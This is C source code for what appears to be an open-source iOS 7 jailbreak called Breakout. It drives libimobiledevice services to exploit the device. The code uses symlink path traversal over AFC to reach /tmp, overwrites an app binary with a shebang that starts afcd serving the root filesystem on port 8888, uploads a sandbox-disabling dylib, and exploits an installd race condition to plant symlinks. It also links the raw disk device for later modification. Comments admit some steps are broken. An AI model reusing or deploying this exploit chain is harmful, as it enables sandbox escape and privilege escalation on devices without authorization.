//
//  breakout.c
//  Breakout
//
//  Created by Joshua Lee Tucker on 31/12/2013.
//  Copyright (c) 2013 Bandit Labs. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

#include <breakout.h>

#include <libimobiledevice/afc.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/installation_proxy.h>
#include <libimobiledevice/file_relay.h>
#include <libimobiledevice/mobilebackup2.h>
#include <libimobiledevice/diagnostics_relay.h>



uint64_t gFh = 0;
unsigned int cb = 0;
unsigned int installError = 0;
unsigned int installing = 1;
int exploit;

char *udid;
char **list = NULL;
char *tmpDir[26];
char *stagingString = "install_staging";

idevice_t gDevice = NULL;
afc_client_t gAfc = NULL;
lockdownd_client_t gLockdown = NULL;
instproxy_client_t gInstproxy = NULL;
file_relay_client_t gFrc = NULL;
diagnostics_relay_client_t gDiag = NULL;
mobilebackup2_client_t gMb = NULL;
instproxy_error_t ie = 0;
instproxy_client_t instproxy = NULL;

lockdownd_error_t lderr = 0;
lockdownd_service_descriptor_t port = NULL;
afc_error_t afcerr = 0;
diagnostics_relay_error_t diagerr = 0;


char fooS[60];
char fooSOld[60];
char fooSNew[60];

void printSplash(void) {
	// uses colour macros in breakout.h
	printf("\n");
	printf(" [*] Breakout - the ");
	printf("%sopen-source", KGRN);
	printf(" %siOS 7 jailbreak.\n", KNRM);
	printf(" [*] by your friendly neighbourhood hustler, ");
	printf("%sDarkMalloc%s and %stihmstar%s.\n\n", KGRN, KNRM,KRED,KNRM);
}

int afc_send_file(afc_client_t afc, const char* local, const char* remote) {
	FILE* fd = NULL;
	uint64_t fh = 0;
	afc_error_t err = 0;
	unsigned int got = 0;
	unsigned int gave = 0;
	unsigned char buffer[0x800];

	fd = fopen(local, "rb");
	if (fd != NULL ) {
		err = afc_file_open(afc, remote, AFC_FOPEN_WR, &fh);
		if (err == AFC_E_SUCCESS) {

			while (!feof(fd)) {
				memset(buffer, '\0', sizeof(buffer));
				got = fread(buffer, 1, sizeof(buffer), fd);
				if (got > 0) {
					afc_file_write(afc, fh, (const char*) buffer, got, &gave);
					if (gave != got) {
						printf("Error!!\n");
						break;
					}
				}
			}

			afc_file_close(afc, fh);
		}
		fclose(fd);
	} else
		return -1;
	return 0;
}

static int afc_remove_directory(afc_client_t afc, const char *path, int incl) /*{{{*/
{
	char **dirlist = NULL;
	if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
		printf("Could not get directory list for %s\n", path);
		return -1;
	}
	if (dirlist == NULL ) {
		if (incl) {
			afc_remove_path(afc, path);
		}
		return 0;
	}

	char **ptr;
	for (ptr = dirlist; *ptr; ptr++) {
		if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
			continue;
		}
		char **info = NULL;
		char *fpath = (char*) malloc(strlen(path) + 1 + strlen(*ptr) + 1);
		strcpy(fpath, path);
		strcat(fpath, "/");
		strcat(fpath, *ptr);
		if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
			// failed. try to delete nevertheless.
			afc_remove_path(afc, fpath);
			free(fpath);
			free_dictionary(info);
			continue;
		}

		int is_dir = 0;
		int i;
		for (i = 0; info[i]; i += 2) {
			if (!strcmp(info[i], "st_ifmt")) {
				if (!strcmp(info[i + 1], "S_IFDIR")) {
					is_dir = 1;
				}
				break;
			}
		}
		free_dictionary(info);

		if (is_dir) {
			afc_remove_directory(afc, fpath, 0);
		}
		afc_remove_path(afc, fpath);
		free(fpath);
	}

	free_dictionary(dirlist);
	if (incl) {
		afc_remove_path(afc, path);
	}

	return 0;
}

static void cp_recursive(const char* from, const char* to) {
	if (!from || !to) {
		return;
	}
	DIR* cur_dir = opendir(from);
	if (cur_dir) {
		struct stat tst;
		struct stat fst;
		if ((stat(from, &fst) == 0) && S_ISDIR(fst.st_mode)) {
			if (stat(to, &tst) != 0) {
				printf("creating new folder at %s", to);
				mkdir(to, fst.st_mode);
			}
		}
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0)
					|| (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}

			char *tpath = (char*) malloc(
					strlen(to) + 1 + strlen(ep->d_name) + 1);
			char *fpath = (char*) malloc(
					strlen(from) + 1 + strlen(ep->d_name) + 1);
			if (fpath && tpath) {
				struct stat st;
				strcpy(fpath, from);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				strcpy(tpath, to);
				strcat(tpath, "/");
				strcat(tpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					printf("copying folder %s to %s\n", fpath, tpath);
					cp_recursive(fpath, tpath);
				} else {

					printf("copying file %s to %s\n", fpath, tpath);
					if (cp(fpath, tpath) != 0) {
						printf("could not copy file %s\n", fpath);
					}
				}

				free(tpath);
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	return;
}

static void mv_recursive(const char* from, const char* to) {
	cp_recursive(from, to);
	rm_recursive(from);
}

static afc_send_directory(afc_client_t* afc, const char* local,
		const char* remote) {
	if (!local || !remote) {
		return 0;
	}
	DIR* cur_dir = opendir(local);
	if (cur_dir) {
		struct stat tst;
		struct stat fst;
		if ((stat(local, &fst) == 0) && S_ISDIR(fst.st_mode)) {
			afc_make_directory(afc, remote);
		}
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0)
					|| (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}

			char *tpath = (char*) malloc(
					strlen(remote) + 1 + strlen(ep->d_name) + 1);
			char *fpath = (char*) malloc(
					strlen(local) + 1 + strlen(ep->d_name) + 1);
			if (fpath && tpath) {
				struct stat st;
				strcpy(fpath, local);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				strcpy(tpath, remote);
				strcat(tpath, "/");
				strcat(tpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					afc_send_directory(afc, fpath, tpath);
				} else {

					if (afc_send_file(afc, fpath, tpath) != 0) {
					}
				}

				free(tpath);
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	return 0;
}

afc_error_t afc_receive_file(afc_client_t afc, const char* remote,
		const char* local) {
	int exit = 0;
	FILE* fd = NULL;
	uint64_t fh = 0;
	afc_error_t err = 0;
	unsigned int got = 0;
	unsigned int gave = 0;
	unsigned char buffer[0x800];

	fd = fopen(local, "wb");
	if (fd != NULL ) {
		err = afc_file_open(afc, remote, AFC_FOPEN_RDONLY, &fh);
		if (err == AFC_E_SUCCESS) {

			while (1) {
				memset(buffer, '\0', sizeof(buffer));
				err = afc_file_read(afc, fh, (const char*) buffer,
						sizeof(buffer), &got);
				if (err == AFC_E_SUCCESS && got > 0) {
					gave = fwrite(buffer, 1, got, fd);
					if (err != AFC_E_SUCCESS || gave != got)
						break;

				} else
					break;
			}

			afc_file_close(afc, fh);
		}
		fclose(fd);
	} else
		return err;

	printf("Copied %s -> %s\n", remote, local);
	return err;
}

void minst_cb(const char *operation, plist_t status, int *unused) {
	cb++;
	if (cb == 1) {
		afc_read_directory(gAfc, "tmp/", &list);
		if (list) {
			while (list[0]) {
					if (strcmp(list[0], ".") && strcmp(list[0], "..")) {
						if (strncmp(stagingString, list[0], 7) == 0) {
							strcpy(tmpDir, "tmp/");
							printf(" [*] Found staging directory: %s\n", list[0]);
							stagingString = list[0];
							strcat(tmpDir, stagingString);
						}
					}
					list++;
			}
        }
	}
    
    if (cb == 1 && exploit >= 1) {
        //@DarkMalloc THIS is where racecondition has to be exploited :P
        snprintf(fooS,50, "tmp/%s/foo_extracted", stagingString);
        snprintf(fooSOld,50, "tmp/%s/foo_extracted.old", stagingString);
        snprintf(fooSNew,50, "tmp/%s/foo_extracted.new", stagingString);
        printf(" [*] Injection vector found - ");
		printf("Injecting exploit...\n");
        
        if (exploit == 2) {
            deviceSymlink("../../..//var/mobile/Library/Preferences/", fooSNew);
        }else {
            deviceSymlink("../../..//var/mobile/Library/Caches/", fooSNew);
        }
        
        
        afcerr = afc_rename_path(gAfc, fooS, fooSOld);
        if (afcerr != AFC_E_SUCCESS) {
            printf("%s [*] Could not rename %s -> %s %s\n\n", KRED, fooS,fooSOld, KNRM);
        }
        afcerr = afc_rename_path(gAfc, fooSNew, fooS);
        if (afcerr != AFC_E_SUCCESS) {
            printf("%s [*] Could not rename foo.new -> foo%s\n\n", KRED, KNRM);
        }
    }
	
	if (status && operation) {
		plist_t npercent = plist_dict_get_item(status, "PercentComplete");
		plist_t nstatus = plist_dict_get_item(status, "Status");
		plist_t nerror = plist_dict_get_item(status, "Error");
		int percent = 0;
		char *status_msg = NULL;
		if (npercent) {
			uint64_t val = 0;
			plist_get_uint_val(npercent, &val);
			percent = val;
		}
		if (nstatus) {
			plist_get_string_val(nstatus, &status_msg);
			if (!strcmp(status_msg, "Complete")) {
				sleep(1);
				installing = 0;
			}
		}

		if (nerror) {
			char *err_msg = NULL;
			plist_get_string_val(nerror, &err_msg);
			printf("Error: %s", err_msg);
			printf("%s\n [*] This would be an error if it wasn't an exploit :P%s\n\n", KNRM, KNRM);
			free(err_msg);
			installing = 0;
			installError = 1;
		}
	} else {
		printf("%s: called with invalid data!\n", __func__);
	}
}

int deviceConnect() {
	// attempt to connnect to device (using libimobiledevice)...
	idevice_error_t ideverr = 0;
	ideverr = idevice_new(&gDevice, NULL);
	if (ideverr != IDEVICE_E_SUCCESS) {
		return -1;
	}
	
	// grab UDID to show which device we're connected to.
	ideverr = idevice_get_udid(gDevice, &udid);
	if (ideverr != IDEVICE_E_SUCCESS) {
		printf("%s [*] Unable to communicate with device. Check your device is plugged in and turned on.%s\n\n", KRED, KNRM);
	}
	
	printf("%s [*] Successfully connected to device with UDID: %s!%s\n\n", KGRN, udid, KNRM);
	return 0;
}

int startLockdownd() {
	// start lockdownd client.
	printf(" [*] Attempting to connect to lockdownd...\n");
	lderr = lockdownd_client_new_with_handshake(gDevice, &gLockdown, "Breakout");
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to connect to lockdownd. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully connected to lockdownd on device: %s!%s\n\n", KGRN, udid, KNRM);
	return 0;
}

int startAFC() {
	// start AFC service on lockdownd.
	printf(" [*] Attempting to start AFC service...\n");
	lderr = lockdownd_start_service(gLockdown, "com.apple.afc", &port);
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to start AFC service. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully started AFC service!%s\n\n", KGRN, KNRM);
	return 0;
}

int connectAFC() {
	// create an AFC client .
	printf(" [*] Attempting to create a new AFC client...\n");
	afcerr = afc_client_new(gDevice, port, &gAfc);
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to create a new AFC client. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	printf("%s [*] Successfully created new AFC client!%s\n\n", KGRN, KNRM);
	return 0;
}

void performSanityChecks() { //this doesnt work at all :(
	// just in case Breakout has been run before, we don't want any issues arising from old/new files.
	printf(" [*] Performing sanity checks...\n");
		
	afcerr = afc_read_directory(gAfc, "/Downloads/WWDC.app", &list);
	if (afcerr != AFC_E_SUCCESS) {
		afc_remove_path(gAfc, "/Downloads/WWDC.app/");
	}

    afcerr = afc_read_directory(gAfc, "/Downloads/a", &list);
	if (afcerr != AFC_E_SUCCESS) {
        afc_remove_path(gAfc, "/Downloads/a");
	}
	
	afcerr = afc_read_directory(gAfc, "/Breakout-Install", &list);
	if (afcerr != AFC_E_SUCCESS) {
		afc_remove_path(gAfc, "/Breakout-Install");
	}
	
	printf("%s [*] Sanity checks complete!!%s\n\n", KGRN, KNRM);
}

int preflightBreakout() {
	// create our dir and upload required files etc.
	printf(" [*] Attempting to create Breakout-Install directory and push required files...\n");
	
	// create a directory in /var/mobile/Media to store our stuff.
	afcerr = afc_make_directory(gAfc, "/Breakout-Install");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to create a Breakout-Install directory. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		afc_client_free(gAfc);
		idevice_free(gDevice);
		return -1;
	}
	
	// upload our custom icon, which is set in the new Info.plist to be uploaded.
	afcerr = afc_send_file(gAfc, "resources/jbicon.png", "Breakout-Install/jbicon.png");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to push required files. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully created Breakout-Install directory and pushed required files!%s\n\n", KGRN, KNRM);
	return 0;
}

void prepareWWDC() {
	// we need this for installd to happily install our custom app :)
	printf(" [*] Downloading code-signed app from Apple...\n");
	//	system("curl -b \"downloadKey=expires=1388797203~access=/us/r1000/098/Purple/v4/c3/4e/98/c34e989a-8522-fde0-db2d-884dd3b1302d/mzps6036043982514941651.D2.pd.ipa*~md5=5bb2ef2cc0ee1f435361e121a1ee2514\" http://a396.phobos.apple.com/us/r1000/098/Purple/v4/c3/4e/98/c34e989a-8522-fde0-db2d-884dd3b1302d/mzps6036043982514941651.D2.pd.ipa -o resources/wwdc.ipa > /dev/null");
	printf("%s [*] Successfully downloaded app!%s\n\n", KGRN, KNRM);
	
	// I know this is ugly and definitely not elegant, but it's easy.
	system("unzip resources/wwdc.ipa > /dev/null");
	system("cp -r Payload/WWDC.app resources/");
	system("cp resources/Info.plist Payload/WWDC.app/Info.plist > /dev/null");
	system("zip -r resources/breakout.ipa Payload/ META-INF/ > /dev/null");
	system("rm -r Payload META-INF > /dev/null");
}

int uploadWWDC() {
	// un-modified version of WWDC.app
	printf(" [*] Attempting to upload original app to /Downloads...\n");

	afcerr = afc_send_directory(gAfc, "resources/WWDC.app", "Downloads/WWDC.app");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to upload original app to /Downloads. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	// we don't need this anymore, clear it.
	system("rm -rf resources/WWDC.app > /dev/null");
		
	printf("%s [*] Successfully uploaded app!%s\n\n", KGRN, KNRM);
	return 0;
}

int uploadBreakout() {
	printf(" [*] Attempting to upload custom IPA to /Breakout-Install...\n");
	
	afcerr = afc_send_file(gAfc, "resources/breakout.ipa", "Breakout-Install/breakout.ipa");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to upload custom IPA. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	// we don't need this anymore, clear it.
	system("rm -rf resources/breakout.ipa > /dev/null");
	
	printf("%s [*] Successfully uploaded custom IPA!%s\n\n", KGRN, KNRM);
	return 0;
}

int startInstallationProxy() {
	// com.apple.mobile.installation_proxy
	printf(" [*] Attempting start installation proxy service...\n");
	lderr = lockdownd_start_service(gLockdown, "com.apple.mobile.installation_proxy", &port);
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to start installation proxy service. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		lockdownd_client_free(gLockdown);
		return -1;
	}
	
	printf("%s [*] Successfully started installation proxy service!%s\n\n", KGRN, KNRM);
	
	printf(" [*] Attempting to connect to installation proxy service...\n");
	
	ie = instproxy_client_new(gDevice, port, &instproxy);
	if (ie != INSTPROXY_E_SUCCESS) {
		printf("%s [*] Unable to connect to installation proxy service. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully connected to installation proxy service!%s\n\n", KGRN, KNRM);
	return 0;
}

int installIPA(char *ipaLocation, int explt) {
	// installs our modified ipa for us, thanks installd
	printf(" [*] Requesting installation proxy to install custom app...\n");
	cb =0;
    plist_t opts = instproxy_client_options_new();
    exploit = explt;
	ie = instproxy_install(instproxy, ipaLocation, opts, &minst_cb, NULL);
	if (ie != INSTPROXY_E_SUCCESS && exploit != 1) {
		printf("%s [*] Installation proxy could not install app %d. Please reboot your device and try again.%s\n\n", KRED, ie, KNRM);
		instproxy_client_options_free(opts);
		instproxy_client_free(instproxy);
		return -1;
	}
	
	while (installing) {
		sleep(1);
	}
	
	if (installError && exploit != 1) {
		return -1;
	}
	
    printf(" [*] Cleaning up instproxy \n");
    instproxy_client_options_free(opts);
    instproxy_client_free(instproxy);
    
    opts = NULL;
    instproxy = NULL;
    
    
	printf("%s [*] Installation proxy successfully installed app!%s\n\n", KGRN, KNRM);
	return 0;
}

int deviceSymlink(char *from, char* to) {
	afcerr = afc_make_link(gAfc, 2, from, to);
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Could not write symlink from %s to %s. Please reboot your device and try again.%s\n\n", KRED, from, to, KNRM);
		return -1;
	}
	return 0;
}

int accessTmpHax() {
	// symlink to /tmp, count the ../../'s
	printf(" [*] Attempting to get access to /tmp through symlink hacks...\n");
	
	afcerr = afc_make_directory(gAfc, "Downloads/a/a/a/a/a");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Could not write symlink to get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	if (deviceSymlink("../../../../../tmp", "Downloads/a/a/a/a/a/link") != 0) {
		return -1;
	}
	
	afcerr = afc_rename_path(gAfc, "Downloads/a/a/a/a/a/link", "tmp");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Could not write symlink to get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	// check if we actually have access to /tmp
	list = NULL;
	afcerr = afc_read_directory(gAfc, "tmp/", &list);
	if (list == NULL) {
		printf("%s [*] Could not get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully got access to /tmp!%s\n\n", KGRN, KNRM);
	return 0;
}

int placeShebang() {
	// replace Downloads/WWDC.app/WWDC with our shebang to launch afcd
	printf(" [*] Attempting to replace original binary with shebang...\n");
	
	uint32_t bw = 0;
	afc_file_open(gAfc, "Downloads/WWDC.app/WWDC", AFC_FOPEN_RW, &gFh);
	afc_file_truncate(gAfc, gFh, 0);
	char *shebang = "#!/usr/libexec/afcd -S -p 8888 -d /\n";
	afc_file_write(gAfc, gFh, shebang, strlen(shebang) -1, &bw);
	if (bw > 0) {
		printf("%s [*] Successfully replaced binary with shebang!%s\n\n", KGRN, KNRM);
	} else {
		printf("%s [*] Could not write overwrite binary. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	return 0;
}

int uploadGameover() {
	// upload gameover.dylib - when loaded, doesn't init sandbox for afcd
	printf(" [*] Attempting to upload gameover.dylib...\n");
	afcerr = afc_send_file(gAfc, "resources/gameover.dylib", "Downloads/WWDC.app/");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Could not upload gameover.dylib. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully uploaded gameover.dylib!%s\n\n", KGRN, KNRM);
	return 0;
}

int startFileRelay() {
	// need to connect to com.apple.mobile.file_relay to get caches...
	printf(" [*] Attempting to start file relay...\n");
	
	lderr = lockdownd_start_service(gLockdown, "com.apple.mobile.file_relay", &port);
	
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to start file_relay service! Please reboot your device and try again.%s\n\n", KRED, KNRM);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	printf("%s [*] Successfully started file_relay service!%s\n\n", KGRN, KNRM);
	
	file_relay_error_t frcerr = 0;
	
	frcerr = file_relay_client_new(gDevice, port, &gFrc);	
	
	if (frcerr != FILE_RELAY_E_SUCCESS) {
		printf("%s [*] Unable to connect to file_relay service! Please reboot your device and try again.%s\n\n", KRED, KNRM);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	return 0;
}

int grabCaches() {
	// sources for request
	idevice_connection_t dump = NULL;
	const char *sources[] = {"Caches", NULL};
	
	
	// actually grab caches
	printf(" [*] Attempting to get caches from com.apple.mobile.file_relay...\n");
	
	if (file_relay_request_sources(gFrc, sources, &dump) != FILE_RELAY_E_SUCCESS) {
		printf("%s [*] Unable to get caches! Please reboot your device and try again.%s\n\n", KRED, KNRM);
		file_relay_client_free(gFrc);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	
	if (!dump) {
		printf("%s [*] Unable to get caches! Please reboot your device and try again.%s\n\n", KRED, KNRM);
		file_relay_client_free(gFrc);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	
	// save caches to disk
	uint32_t cnt = 0;
	uint32_t len = 0;
	char buf[4096];
	FILE *f = fopen("resources/caches.cpio.gz", "w");
	setbuf(stdout, NULL);
	printf(" [*] Receiving Caches...\n");
	while (idevice_connection_receive(dump, buf, 4096, &len) == IDEVICE_E_SUCCESS) {
		fwrite(buf, 1, len, f);
		cnt += len;
		len = 0;
	}
	fclose(f);
	printf("%s [*] Successfully received caches! Total size received: %d\n\n%s", KGRN,cnt, KNRM);
	
	
	// unpack caches, extract needs plists and clean up after
	
	system("mkdir resources/extracted > /dev/null");
	printf(" [*] Extracting caches...\n");
	system("tar -C resources/extracted -xvf resources/caches.cpio.gz &> /dev/null");
	system("mv resources/extracted/var/mobile/Library/Caches/com.apple.mobile.installation.plist . > /dev/null");
	system("mv resources/extracted/var/mobile/Library/Caches/com.apple.LaunchServices*.csstore . > /dev/null");
	system("echo \"\" > com.apple.LaunchServices-055.csstore");
	system("rm -rf resources/extracted/ resources/caches.cpio.gz > /dev/null");
	printf("%s [*] Successfully unpacked caches!\n\n%s", KGRN, KNRM);
	return 0;
}

int putCaches() {
	
	printf(" [*] Packing Caches\n");
    system("cp resources/com.apple.backboardd.plist . > /dev/null");
	system("zip -m -r resources/pkg.zip com.apple.mobile.installation.plist com.apple.LaunchServices*.csstore > /dev/null");
	system("zip -m -r resources/pkg2.zip com.apple.backboardd.plist > /dev/null");
	
	printf(" [*] Copying Caches via afc\n");

	afcerr = afc_send_file(gAfc, "resources/pkg.zip", "Breakout-Install/pkg.zip");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to upload pkg.zip. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
    printf("%s [*] Successfully uploaded pkg.zip !%s\n", KGRN, KNRM);
    afcerr = afc_send_file(gAfc, "resources/pkg2.zip", "Breakout-Install/pkg2.zip");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to upload pkg2.zip. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
    printf("%s [*] Successfully uploaded pkg2.zip !%s\n\n", KGRN, KNRM);
	
	// we don't need this anymore, clear it.
	system("rm -rf resources/pkg.zip > /dev/null");
	system("rm -rf resources/pkg2.zip > /dev/null");
	
	return 0;
	
}

int rebootDevice(){
    printf(" [*] Attempting to reboot the device ...\n");
    if (startLockdownd() != 0) {
        printf("%s [*] Error starting Lockdownd %s\n",KRED,KNRM);
		return -1;
	}

	lderr = lockdownd_start_service(gLockdown, "com.apple.mobile.diagnostics_relay", &port);
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Error starting diags service%s\n", KRED, KNRM);
		return -1;
	}
	
	diagerr = diagnostics_relay_client_new(gDevice, port, &gDiag);
	if (diagerr != DIAGNOSTICS_RELAY_E_SUCCESS) {
		printf("%s [*] Error creating diags client\n%s",KRED,KNRM);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	
	diagerr = diagnostics_relay_restart(gDiag, DIAGNOSTICS_RELAY_ACTION_FLAG_DISPLAY_PASS);
	if (diagerr != DIAGNOSTICS_RELAY_E_SUCCESS && diagerr != -2) {
		printf("%s [*] Error rebooting\n%s",KRED,KNRM);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
    
    //give it time to disconnect, before trying to reconnect
    printf(" [*] Rebooting device ...\n");
    sleep(30);
    
    return 0;
}

int connectAFCHack(int tapIcon){
    
    // start lockdownd client.
	if (startLockdownd() != 0) {
		return -1;
	}
	
	// start AFC service on lockdownd to create port struct
	if (startAFC() != 0) {
		return -1;
	}
    if (freeLockdown() != 0) {
		return -1;
	}
    
    //starting AFCHack client
    printf(" [*] Waiting for AFCHack service ...\n");
    if (tapIcon == 1) {
        printf(" [*] Please tap the \"Breakout\" icon to continue ...\n");
    }else{
        printf(" [*] Please unlock your device to continue ...\n");
    }
    port->port = 8888;
    while (1) {
        afcerr = afc_client_new(gDevice, port, &gAfc);
        if (!(afcerr != AFC_E_SUCCESS)) {
            break;
        }
        sleep(3);
    }
    printf("%s [*] Successfully connected to AFCHack client %s\n\n",KGRN,KNRM);
    

    
    return 0;
}

int freeLockdown() {
    printf(" [*] Freeing Lockdownd\n\n");
    lderr = lockdownd_client_free(gLockdown);
    if (lderr != LOCKDOWN_E_SUCCESS){
        printf("%s [*] Error freeing lockdownd %d %s\n",KRED,lderr,KNRM);
    }
	gLockdown = NULL;
    return 0;
}

int symlinkRdisk() {
    
    afcerr = afc_rename_path(gAfc, "/var/mobile/Library/Logs/AppleSupport", "/var/mobile/Library/Logs/AppleSupport.orig");
    if (afcerr != AFC_E_SUCCESS) {
        printf("%s [*] Could not rename AppleSupport -> AppleSupport.orig - deleting AppleSupport%s\n", KRED, KNRM);
        afc_remove_path(gAfc, "/var/mobile/Library/Logs/AppleSupport");
    }
    printf(" [*] Creating symlink to chown rdisk\n");
    if (deviceSymlink("../../../../../dev/rdisk0s1s1", "/var/mobile/Library/Logs/AppleSupport") != 0) {
		return -1;
	}
}

int AFCHackAutoLaunch(){
    printf(" [*] Telling applicationState to autolaunch AFCHack\n");
    
    afcerr = afc_send_file(gAfc, "resources/applicationState.plist", "/var/mobile/Library/BackBoard/applicationState.plist");
    if (afcerr != AFC_E_SUCCESS) {
        printf("%s [*] Error uploading applicationState.plist\n%s",KRED,KNRM);
        return -1;
    }

    
}

int main(int argc, char *argv[]) {
	
	// let's clean this up a little bit.
	printSplash();
   
    
	// attempt to connnect to device (using libimobiledevice)...
    printf(" [*] Attempting to connect to device...\n");
	if (deviceConnect() != 0) {
        printf("%s [*] Unable to connect to device. Check your device is plugged in and turned on.%s\n\n", KRED, KNRM);
		return -1;
	}
     
	// start lockdownd client.
	if (startLockdownd() != 0) {
		return -1;
	}
	
	// start AFC service on lockdownd.
	if (startAFC() != 0) {
		return -1;
	}
    if (freeLockdown() != 0) {
		return -1;
	}
	// create an AFC client and connect to AFC service.
	if (connectAFC() != 0) {
		return -1;
	}
		
	// just in case Breakout has been run before, we don't want any issues arising from old/new files.
	performSanityChecks(); //this doesnt work at all :(                                            ####
	
    
	// create our storage dir and upload requires files etc.	
	if (preflightBreakout() != 0) {
		return -1;
	}
	
	// download, unzip, modify and re-zip wwdc etc.
	prepareWWDC();
	
	// upload unmodified app to device.
	if (uploadWWDC() != 0) {
		return -1;
	}
	
	// upload custom IPA 
	if (uploadBreakout() != 0) {
		return -1;
	}
    
	// reconnect to lockdownd
	if (startLockdownd() != 0) {
		return -1;
	}
	
	// start com.apple.mobile.installation_proxy
	if (startInstallationProxy() != 0) {
		return -1;
	}
    //lockdownd already freed here
    
	// install custom (breakout) ipa
    
	if (installIPA("Breakout-Install/breakout.ipa",0) != 0) {
		return -1;
	}

	// get access to /tmp, we need this
	if (accessTmpHax() != 0) {
		return -1;
	}
	
	// replace Downloads/WWDC.app/WWDC with our shebang 
	if (placeShebang() != 0) {
		return -1;
	}
	
	// upload gameover.dylib to kill sandbox in WWDC.app (afcd)
	if (uploadGameover() != 0) {
		return -1;
	}
	
	// reconnect to lockdownd
	if (startLockdownd() != 0) {
		return -1;
	}
	
	if (startFileRelay() != 0) {
		return -1;
	}
    if (freeLockdown() != 0) {
		return -1;
	}
    
	if (grabCaches() != 0) {
		return -1;
	}

	
	//you need to modify the caches and add the values here                              ####
	//                                                                                   ####
	//

    if (putCaches() != 0) {
		return -1;
	}

	//race condition exploit :P
     //you need to fix minst_cb not called second time                                   ####
     //that means you acn either inject breakout.ipa or exploit race condition :(        ####
	printf(" [*] Trying to exploit race condition (1/2)\n");
	if (installIPA("Breakout-Install/pkg.zip",1) !=0){
		return -1;
	}
    printf(" [*] Trying to exploit race condition (2/2)\n");
	if (installIPA("Breakout-Install/pkg.zip",2) !=0){
		return -1;
	}
     
    //rebooting + waiting to reconnect
    if (rebootDevice() != 0) {
        printf("%s [*] Error rebooting device, please disconnect, reboot manually and reconnect\n%s",KRED,KNRM);
        sleep(20);
    }
    
    
    
    printf(" [*] Waiting for the device to reconnect...\n");
	while (deviceConnect() != 0) {
		sleep(1);
	}
	printf(" [*] Device found! Continuing\n\n");
	
	//connect to hack afcd
    connectAFCHack(1);
    
    if (symlinkRdisk() != 0) {
        return -1;
    }
    
    if (AFCHackAutoLaunch() != 0) {
        return -1;
    }
    
    //rebooting
    if (rebootDevice() != 0) {
        printf("%s [*] Error rebooting device, please disconnect, reboot manually and reconnect\n%s",KRED,KNRM);
        sleep(20);
    }
    
    printf(" [*] Waiting for the device to reconnect...\n");
	while (deviceConnect() != 0) {
		sleep(1);
	}
	printf(" [*] Device found! Continuing\n\n");
	
    
    connectAFCHack(0); //don't tell user to tap the app
	
    
    
	// Now the userland portion is almost finished
    // have fun writing your untether binary to the BlockDevice (rdisk0s1s1) :P
    // i will create a Cydia.tar Payload to clean everything up :D
	
    
    
    
    printf("%s [*] No errors yey :D!%s\n", KGRN, KNRM);
	return 0;
